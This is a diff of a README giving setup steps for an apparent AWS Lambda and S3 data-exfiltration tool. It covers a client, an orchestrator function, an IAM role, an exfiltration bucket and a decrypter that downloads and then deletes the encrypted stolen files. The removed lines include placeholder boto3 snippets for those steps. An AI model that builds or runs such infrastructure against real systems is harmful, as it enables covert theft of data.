@@ -20,13 +20,13 @@ Here we will discuss how to set up a working client for data exfiltration.
 #### Client Setup
 Open `standaloneClient_template.py` and modify the following lines with desired values.  
 
-*Line 11*  Modify partition size  
-`partitionSize = 100 #Change for desired partition size`  
-*Line 42*  Modify Orchestrator function name (Remember it)  
-`orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', 
-                                       Payload = orqPayload_json)`  
-*Line 85* Modify with AWS Keys  
-`client.awsConnect('<ACCESS_KEY_ID>','<SECRET_ACCESS_KEY_ID>','<REGION>')`  
+Modify first lines with required data. You will need  
+
+- fernet_key (You will need the same key for the decrypter. The key can be generated in a separate script with Fernet.generate_key())
+- orchestrator_function_name (Remember it for later)
+- aws_access_key_id
+- aws_secret_access_key
+- region_name
 
 #### IAM Console
 Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:  
@@ -45,8 +45,9 @@ Create 2 buckets with default config and remember their names. One will be used 
 
 #### Sample Function Setup
 Open `sampleFunction_template.py`.  
-*Line 6*  Modify with the exfiltration bucket name  
-`bucket_name = "<EXFILTRATION_BUCKET_NAME>"`  
+Modify first lines with required data. You will need  
+
+- exfiltration_bucket_name
 
 Compress the function and upload it to the template bucket created before. Remember the compressed function name. We should now have a sampleFunction_template.zip inside our template bucket.  
 
@@ -56,12 +57,10 @@ Give the function the role previously created. This can be done by scrolling dow
 
 Copy and paste the contents of `orchestrator_template.py` into the newly created lambda function.  
 
-*Line 26*  Modify IAM Role ARN  
-`Role = '<LAMBDA_S3_IAM_ROLE>'`  
-*Line 29*  Modify Template Bucket Name  
-`'S3Bucket': '<TEMPLATES_BUCKET>'`  
-*Line 30* Modify Compressed function name  
-`'S3Key': '<COMPRESSED_FUNCTION_NAME>'`  
+Modify first lines with required data. You will need  
+
+- template_bucket_name
+- compressed_function_name
 
 Increase the timeout of this function to 1 minute and memory to 512MB  
 
@@ -70,14 +69,11 @@ Files saved inside our exfiltration bucket are encrypted so... we ned a way to d
 
 Open `sampledecrypter_template.py`  
 
-*Line 7*  Modify fernet key. The key can be generated in a separate script with `Fernet.generate_key()`  
-`key = b'<FERNET_KEY>'`  
-*Line 23-25*  Modify AWS Tokens and region  
-`session = boto3.session.Session(aws_access_key_id = '<AWS_ACCESS_KEY_ID>',
- 								aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>',
- 								region_name = 'us-east-2')`  
-*Line 31,58,80,82* Modify Exfiltration bucket name  
-`31- Bucket = '<EXFILTRATION_BUCKET_NAME>'`  
-`58- aws_s3_resource.meta.client.download_file('<EXFILTRATION_BUCKET_NAME>', file, 'downloadedFiles/'+name)'`  
-`80- bucket = aws_s3_resource.Bucket('<EXFILTRATION_BUCKET_NAME>')`  
-`82- aws_s3_resource.Object('<EXFILTRATION_BUCKET_NAME>', file).delete()`  
+Modify first lines with required data. You will need  
+
+- fernet_key
+- aws_access_key_id
+- aws_secret_access_key
+- region_name
+- exfiltration_bucket_name
+
